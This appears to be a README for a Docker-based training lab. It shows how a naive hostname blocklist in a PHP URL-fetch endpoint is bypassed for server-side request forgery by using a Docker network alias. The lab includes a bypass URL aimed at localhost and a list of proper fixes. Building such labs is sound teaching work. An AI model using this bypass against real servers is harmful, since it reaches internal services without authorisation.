# 🚫 SSRF Level 2 — Naive Blocklist Bypass (Docker Alias)

A lab demonstrating how a naive hostname blocklist can be bypassed using a Docker network alias.

---

## 📁 Project Structure

    level2/
    ├── Dockerfile
    ├── README.md
    └── src/
        ├── index.php
        ├── fetch.php
        ├── config.php
        ├── health.php
        ├── reset.php
        └── style.css

---

## 🐳 Run with Docker (Dockerfile only)

Build:

    cd labs/ssrf/level2
    docker build -t diable-ssrf-l2 .

Run:

    docker run --rm -d --name diable-ssrf-l2 -p 8082:80 diable-ssrf-l2

Open:

    http://localhost:8082

Stop:

    docker stop diable-ssrf-l2

---

## 🧪 Internal Service + Alias (for bypass demo)

This level assumes an internal service exists on a Docker network and is reachable via:
- its normal name: `internal-api`
- an alias: `svc`

Create a Docker network:

    docker network create ssrf-net 2>/dev/null || true

Run the internal API with an alias:

    docker rm -f internal-api 2>/dev/null
    docker run -d --name internal-api --network ssrf-net --network-alias svc \
      hashicorp/http-echo:0.2.3 -listen=:9000 -text="INTERNAL_OK"

Run the lab container on the same network:

    docker rm -f diable-ssrf-l2 2>/dev/null
    docker run --rm -d --name diable-ssrf-l2 --network ssrf-net -p 8082:80 diable-ssrf-l2

---

## 🎯 Endpoint

    GET /fetch.php?url=

Example (public):

    http://localhost:8082/fetch.php?url=http://example.com

---

## 🚨 The Vulnerability

The application tries to block SSRF by rejecting URLs that contain the hostname `internal-api`.
This is a naive string-based filter.

The same internal service can still be reached via a Docker network alias (e.g., `svc`),
so the blocklist is bypassed.

---

## 🧪 Example Attack

Blocked:

    http://localhost:8082/fetch.php?url=http://internal-api:9000

Bypass (alias):

    http://localhost:8082/fetch.php?url=http://svc:9000

Expected output contains:

    INTERNAL_OK

---

## 🛡 Real Fix (not implemented here)

- Parse URL properly (scheme/host/port)
- Resolve hostname to IP before validation
- Block private/internal IP ranges
- Prefer allowlists over blocklists
- Restrict outbound network access by default

---

## ⚠ Disclaimer

Educational use only.
